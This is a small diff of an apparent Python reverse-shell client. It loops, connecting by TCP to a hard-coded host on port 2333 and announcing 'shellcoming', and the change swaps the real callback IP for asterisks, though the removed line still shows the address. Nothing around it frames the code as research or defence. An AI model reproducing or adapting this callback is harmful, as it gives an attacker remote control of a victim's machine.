@@ -13,7 +13,7 @@ if __name__ == "__main__":
         server=socket(AF_INET,SOCK_STREAM)
         while 1>0:
                 try:
-                        server.connect(('23.83.249.21',2333))
+                        server.connect(('****',2333))
                         server.send('shellcoming\n')
                         break
                 except:
